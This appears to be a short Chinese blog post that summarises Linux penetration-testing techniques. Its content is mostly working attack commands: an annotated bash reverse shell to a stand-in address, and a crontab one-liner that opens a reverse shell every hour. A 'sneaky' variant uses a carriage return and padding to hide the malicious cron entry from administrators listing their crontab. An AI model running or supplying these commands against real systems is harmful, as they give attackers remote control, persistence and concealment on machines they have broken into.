---
title: 学习总结篇—Linux
date: 2019-8-27 00:20:02
author: dylan
top: false
cover: false
summary: 学习总结篇—Linux
password: 9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe
categories: summary
tags: 
    - Linux
    - summary
---

# 前言

 Linux渗透测试总结

# bash

```
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

`bash -i`                   #交互的 shell 
`&`                         #标准错误输出到标准输出
`/dev/tcp/10.0.0.1/8080`    #建立 socket ip port
`0>&1`                      #标准输入到标准输出
```

```
(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
```

## 猥琐版

```
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab -
```
详细介绍：
[https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md](https://github.com/dylan903/security_circle_2017/blob/master/15288418585142.md)

# 参考文章

[史上最强内网渗透知识点总结](https://blog.csdn.net/qq_33020901/article/details/80547964)
